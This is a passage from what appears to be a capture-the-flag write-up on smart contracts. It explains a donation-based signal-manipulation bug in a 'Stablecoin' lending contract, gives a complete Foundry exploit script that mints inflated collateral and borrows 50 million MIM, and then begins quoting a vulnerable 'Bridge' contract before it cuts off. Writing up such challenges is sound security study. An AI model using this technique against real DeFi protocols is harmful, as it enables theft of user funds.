&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Manager&lt;&#x2F;span&gt;&lt;span&gt; balance of ETH :  2000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Manager&lt;&#x2F;span&gt;&lt;span&gt; balance of MIM :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Manager&lt;&#x2F;span&gt;&lt;span&gt; Owner balance of ETH :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Manager&lt;&#x2F;span&gt;&lt;span&gt; Owner balance of MIM :  3395000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Manager&lt;&#x2F;span&gt;&lt;span&gt; Owner balance of protocolCollateralToken :  2000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Manager&lt;&#x2F;span&gt;&lt;span&gt; Owner balance of protocolDebtToken :  3520000000000000001485
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Player&lt;&#x2F;span&gt;&lt;span&gt; balance of ETH :  6000000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Player&lt;&#x2F;span&gt;&lt;span&gt; balance of MIM :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Player&lt;&#x2F;span&gt;&lt;span&gt; balance of protocolCollateralToken :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Player&lt;&#x2F;span&gt;&lt;span&gt; balance of protocolDebtToken :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;protocolCollateralToken&lt;&#x2F;span&gt;&lt;span&gt; Signal:  20000000000000000000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;protocolDebtToken&lt;&#x2F;span&gt;&lt;span&gt; Signal :  1036818851251840943
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;When the Manager owner added the collatoral token as ETH, &lt;code&gt;protocolCollateralToken&lt;&#x2F;code&gt; and &lt;code&gt;protocolDebtToken&lt;&#x2F;code&gt; will be deployed.  And curresponding signal values are added by the owner.&lt;&#x2F;p&gt;
&lt;p&gt;Lets do the backtracking, our goal is to get the MIM tokens, where the transfer&#x2F;mint of MIM happens? In the &lt;code&gt;_updateDebt()&lt;&#x2F;code&gt; internal function which is called at once in &lt;code&gt;manage()&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;So, need to understand what does this &lt;code&gt;manage()&lt;&#x2F;code&gt; function do. When called, it can either add or remove ETH collateral and mint or burn MIM tokens. When adding collateral, it transfers ETH from the user to the Manager and mints protocolCollateralToken to the user. When minting MIM, it creates new MIM tokens and mints protocolDebtToken to track the debt. The function uses a signal-based system where both collateral and debt tokens have signal multipliers that affect the actual balances and health calculations. The protocol checks the position&#x27;s health factor after each operation to ensure proper collateralization.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;    function _updateCollateral(
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token,
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolCollateralToken,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 collateralDelta,
&lt;&#x2F;span&gt;&lt;span&gt;        bool collateralIncrease
&lt;&#x2F;span&gt;&lt;span&gt;    ) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        if (collateralDelta == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            return;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (collateralIncrease) {
&lt;&#x2F;span&gt;&lt;span&gt;            protocolCollateralToken.mint(msg.sender, collateralDelta);
&lt;&#x2F;span&gt;&lt;span&gt;            token.safeTransferFrom(msg.sender, address(this), collateralDelta);
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            protocolCollateralToken.burn(msg.sender, collateralDelta);
&lt;&#x2F;span&gt;&lt;span&gt;            token.safeTransfer(msg.sender, collateralDelta);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;If we observe here,  While adding collatoral the collatoral token will be transferred from user to Manager and the &lt;code&gt;protocolCollateralToken&lt;&#x2F;code&gt; is also minted to track the user collatoral amount. And this collatoral amount will affects the health of the user. If we closely look at the &lt;code&gt;protocolCollateralToken.mint(msg.sender, collateralDelta)&lt;&#x2F;code&gt; line.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function mint(address to, uint256 amount) external onlyManager {
&lt;&#x2F;span&gt;&lt;span&gt;    _mint(to, amount.divUp(signal));
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Hmm, something is interesting, its not the usual mint. mint amount is calculated by doing &lt;code&gt;divUp&lt;&#x2F;code&gt; with the &lt;code&gt;signal&lt;&#x2F;code&gt;. So, can we make this &lt;code&gt;divUp()&lt;&#x2F;code&gt; calculation to result very large amount so that our &lt;code&gt;protocolCollatoralToken&lt;&#x2F;code&gt; coallatoral will be high and we can get more &lt;code&gt;mim&lt;&#x2F;code&gt; tokens due to increase of collatoral and health factor.&lt;&#x2F;p&gt;
&lt;p&gt;Okay, now how can we do this? By modifying the &lt;code&gt;signal&lt;&#x2F;code&gt; value.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; Manager
&lt;&#x2F;span&gt;&lt;span&gt;function _updateSignals(
&lt;&#x2F;span&gt;&lt;span&gt;    IERC20 token,
&lt;&#x2F;span&gt;&lt;span&gt;    ERC20Signal protocolCollateralToken,
&lt;&#x2F;span&gt;&lt;span&gt;    ERC20Signal protocolDebtToken,
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 totalDebtForCollateral
&lt;&#x2F;span&gt;&lt;span&gt;) internal {
&lt;&#x2F;span&gt;&lt;span&gt;    protocolDebtToken.setSignal(totalDebtForCollateral);
&lt;&#x2F;span&gt;&lt;span&gt;    protocolCollateralToken.setSignal(token.balanceOf(address(this)));
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; ERC20Signal 
&lt;&#x2F;span&gt;&lt;span&gt;function setSignal(uint256 backingAmount) external onlyManager {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 supply = ERC20.totalSupply();
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 newSignal = (backingAmount == 0 &amp;amp;&amp;amp; supply == 0) ? ProtocolMath.ONE : backingAmount.divUp(supply);
&lt;&#x2F;span&gt;&lt;span&gt;    signal = newSignal;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The &lt;code&gt;_updateSignals()&lt;&#x2F;code&gt; is called inside the &lt;code&gt;liquidate()&lt;&#x2F;code&gt; function. So, liquidating the manager owner will update the signals. The &lt;code&gt;protocolCollatoralToken&lt;&#x2F;code&gt; signal is updated with the value of &lt;code&gt;token.balanceOf(address(this))&lt;&#x2F;code&gt;, token here is ETH. So, since it is calculating the balance of &lt;code&gt;address(this)&lt;&#x2F;code&gt;, i.e manager. We can donate ETH to manager by doing &lt;code&gt;eth.transfer(address(manager), (large ETH)&lt;&#x2F;code&gt;. Now this causes an undefined behaviour in &lt;code&gt;setSignal()&lt;&#x2F;code&gt; function and the &lt;code&gt;backingAmount.divUp(supply)&lt;&#x2F;code&gt; will execute which make the signal value very low than compared to the initial one.&lt;&#x2F;p&gt;
&lt;p&gt;So, we succeeded in manipulating the &lt;code&gt;protocolCollatoralToken&lt;&#x2F;code&gt; signal. Now the signal of the &lt;code&gt;protocolCollatoralToken&lt;&#x2F;code&gt; is smaller (at least less than 1e18). Now what happens if we call the &lt;code&gt;manage()&lt;&#x2F;code&gt; again with very small increase in &lt;code&gt;collatoralToken&lt;&#x2F;code&gt;?&lt;&#x2F;p&gt;
&lt;p&gt;Lets say, we called &lt;code&gt;manage(eth, 1 , true, 0, false)&lt;&#x2F;code&gt;. Now ultimately the following &lt;code&gt;mint()&lt;&#x2F;code&gt; will execute. So, now the signal showing up here is the manipulated one (we reduced it to less than 1e18).&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function mint(address to, uint256 amount) external onlyManager {
&lt;&#x2F;span&gt;&lt;span&gt;    _mint(to, amount.divUp(signal));
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;function divUp(uint256 a, uint256 b) internal pure returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;    if (a == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;        return 0;
&lt;&#x2F;span&gt;&lt;span&gt;    } else {
&lt;&#x2F;span&gt;&lt;span&gt;        return (((a * ONE) - 1) &#x2F; b) + 1;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;So, the result from the &lt;code&gt;divUp()&lt;&#x2F;code&gt; will be very high. i.e, we are minting more &lt;code&gt;protocolCollatoralToken&lt;&#x2F;code&gt; by only sending only &lt;code&gt;1 wei&lt;&#x2F;code&gt; of ETH. But this &lt;code&gt;manage()&lt;&#x2F;code&gt; with only 1 wei collatoral increase should be done for several times till we got the good health factor. Once we have the very good health factor and we can able to borrow all &lt;code&gt;50,000,000&lt;&#x2F;code&gt; MIM in one go.&lt;&#x2F;p&gt;
&lt;p&gt;Find my messy exploit below,&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Stablecoin.s.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;..&#x2F;src&#x2F;Stablecoin.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract StablecoinSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    Stablecoin public stablecoin = Stablecoin(0xE78Ab96cb44c5dDd3d51e2B96295b27c78D102d9);
&lt;&#x2F;span&gt;&lt;span&gt;    Manager public manager = stablecoin.manager();
&lt;&#x2F;span&gt;&lt;span&gt;    Token public mim = stablecoin.mim();
&lt;&#x2F;span&gt;&lt;span&gt;    Token public eth = stablecoin.eth();
&lt;&#x2F;span&gt;&lt;span&gt;    address player = vm.envAddress(&amp;quot;PLAYER&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F;Manager owner executes the following code:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; manager.addCollateralToken(IERC20(address(ETH)), new PriceFeed(), 20_000_000_000_000_000 ether, 1 ether);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; ETH.mint(address(this), 2 ether);
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; ETH.approve(address(manager), type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; manager.manage(ETH, 2 ether, true, 3395 ether, true);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; (, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(ETH)));
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; manager.updateSignal(debtToken, 3520 ether);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function run() external{
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Stablecoin : &amp;quot;, address(stablecoin));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager : &amp;quot;, address(manager));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager Owner: &amp;quot;, address(manager.owner()));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;MIM : &amp;quot;, address(mim));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;MIM Manager : &amp;quot;, address(mim.manager()));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;ETH : &amp;quot;, address(eth));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;ETH Manager : &amp;quot;, address(eth.manager()));
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        (ERC20Signal protocolCollateralToken,
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolDebtToken,
&lt;&#x2F;span&gt;&lt;span&gt;        PriceFeed priceFeed,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 operationTime,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 baseRate ) =  manager.collateralData(IERC20(eth));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;protocolCollateralToken : &amp;quot;, address(protocolCollateralToken));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;protocolCollateralToken Signal: &amp;quot;, protocolCollateralToken.signal());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;protocolCollateralToken totalSupply(): &amp;quot;, protocolCollateralToken.totalSupply());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;protocolDebtToken : &amp;quot;, address(protocolDebtToken));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;protocolDebtToken Signal : &amp;quot;, protocolDebtToken.signal());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;protocolDebtToken totalSupply(): &amp;quot;, protocolDebtToken.totalSupply());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;-------------------------------&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager balance of ETH : &amp;quot;, eth.balanceOf(address(manager)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager balance of MIM : &amp;quot;, mim.balanceOf(address(manager)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager Owner balance of ETH : &amp;quot;, eth.balanceOf(address(manager.owner())));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager Owner balance of MIM : &amp;quot;, mim.balanceOf(address(manager.owner())));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager Owner balance of protocolCollateralToken : &amp;quot;, protocolCollateralToken.balanceOf(address(manager.owner())));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager Owner balance of protocolDebtToken : &amp;quot;, protocolDebtToken.balanceOf(address(manager.owner())));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of ETH : &amp;quot;, eth.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of MIM : &amp;quot;, mim.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of protocolCollateralToken : &amp;quot;, protocolCollateralToken.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of protocolDebtToken : &amp;quot;, protocolDebtToken.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;protocolCollateralToken Signal: &amp;quot;, protocolCollateralToken.signal());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;protocolDebtToken Signal : &amp;quot;, protocolDebtToken.signal());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;-------------------------------&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;isSolved() : &amp;quot;, stablecoin.isSolved());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        mim.approve(address(manager), type(uint256).max );
&lt;&#x2F;span&gt;&lt;span&gt;        eth.approve(address(manager), type(uint256).max );
&lt;&#x2F;span&gt;&lt;span&gt;        manager.manage(eth, 2.1 ether, true, 3521 ether, true);
&lt;&#x2F;span&gt;&lt;span&gt;        eth.transfer(address(manager), 5990 ether);
&lt;&#x2F;span&gt;&lt;span&gt;        manager.liquidate(manager.owner());
&lt;&#x2F;span&gt;&lt;span&gt;        for (uint i = 0; i &amp;lt; 850; i++){
&lt;&#x2F;span&gt;&lt;span&gt;            manager.manage(eth, 1 , true, 0, false);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        manager.manage(eth, 0 , false, 50_000_000 ether , true);
&lt;&#x2F;span&gt;&lt;span&gt;        mim.transfer(address(0xdeadbeef), mim.balanceOf(player) - 50_000_000 ether);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;-------------------------------&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager balance of ETH : &amp;quot;, eth.balanceOf(address(manager)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager balance of MIM : &amp;quot;, mim.balanceOf(address(manager)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager Owner balance of ETH : &amp;quot;, eth.balanceOf(address(manager.owner())));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager Owner balance of MIM : &amp;quot;, mim.balanceOf(address(manager.owner())));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager Owner balance of protocolCollateralToken : &amp;quot;, protocolCollateralToken.balanceOf(address(manager.owner())));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Manager Owner balance of protocolDebtToken : &amp;quot;, protocolDebtToken.balanceOf(address(manager.owner())));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of ETH : &amp;quot;, eth.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of MIM : &amp;quot;, mim.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of protocolCollateralToken : &amp;quot;, protocolCollateralToken.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of protocolDebtToken : &amp;quot;, protocolDebtToken.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;protocolCollateralToken Signal: &amp;quot;, protocolCollateralToken.signal());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;protocolDebtToken Signal : &amp;quot;, protocolDebtToken.signal());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;-------------------------------&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;isSolved() : &amp;quot;, stablecoin.isSolved());
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; revert();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;bridge&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#bridge&quot; aria-label=&quot;Anchor link for: bridge&quot;&gt;Bridge&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;P: &quot;You&#x27;ve stumbled upon a cross-chain bridge contract, enabling ETH and ERC20 token transfers between chains. The Bridge contract has 100 ether of flag token. You are given 1 ether of flag token. Your goal is to drain Bridge contract below 90 ether.&quot;&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Bridge.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F;SPDX-License-Identifier:MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.20;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Address} from &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;utils&#x2F;Address.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {IERC20, IERC20Metadata} from &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;extensions&#x2F;IERC20Metadata.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {ERC20} from &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {ERC777} from &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;token&#x2F;ERC777&#x2F;ERC777.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Bridge {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public immutable CHAIN_ID;
&lt;&#x2F;span&gt;&lt;span&gt;    address public immutable FLAG_TOKEN;
&lt;&#x2F;span&gt;&lt;span&gt;    address public relayer;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(uint256 =&amp;gt; address) public remoteBridge;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; uint256) public remoteBridgeChainId;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(uint256 =&amp;gt; mapping(address =&amp;gt; bool)) public isTokenRegisteredAtRemote;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 internal msgNonce;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(bytes32 =&amp;gt; bool) public relayedMessages;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public relayedMessageSenderChainId;
&lt;&#x2F;span&gt;&lt;span&gt;    address public relayedMessageSenderAddress;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; address) public remoteTokenToLocalToken;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; bool) public isBridgedERC20;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event SendRemoteMessage(
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 indexed targetChainId,
&lt;&#x2F;span&gt;&lt;span&gt;        address indexed targetAddress,
&lt;&#x2F;span&gt;&lt;span&gt;        address indexed sourceAddress,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 msgValue,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 msgNonce,
&lt;&#x2F;span&gt;&lt;span&gt;        bytes msgData
&lt;&#x2F;span&gt;&lt;span&gt;    );
&lt;&#x2F;span&gt;&lt;span&gt;    event RelayedMessage(bytes32 indexed msgHash);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event ETH_transfer(address indexed to, uint256 amount);
&lt;&#x2F;span&gt;&lt;span&gt;    event ERC20_register(address indexed token, string name, string symbol);
&lt;&#x2F;span&gt;&lt;span&gt;    event ERC20_transfer(address indexed token, address indexed to, uint256 amount);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _relayer, address flagToken, uint256 chainId) {
&lt;&#x2F;span&gt;&lt;span&gt;        relayer = _relayer;
&lt;&#x2F;span&gt;&lt;span&gt;        FLAG_TOKEN = flagToken;
&lt;&#x2F;span&gt;&lt;span&gt;        CHAIN_ID = chainId;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier onlyRelayer() {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == relayer, &amp;quot;R&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier onlyRemoteBridge() {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 senderChainId = Bridge(payable(msg.sender)).relayedMessageSenderChainId();
&lt;&#x2F;span&gt;&lt;span&gt;        require(
&lt;&#x2F;span&gt;&lt;span&gt;            msg.sender == remoteBridge[senderChainId] &amp;amp;&amp;amp; senderChainId != 0
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;amp;&amp;amp; remoteBridgeChainId[msg.sender] == senderChainId,
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;quot;RB&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved() external view returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        return IERC20(FLAG_TOKEN).balanceOf(address(this)) &amp;lt; 90 ether;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function registerRemoteBridge(uint256 _remoteChainId, address _remoteBridge) external onlyRelayer {
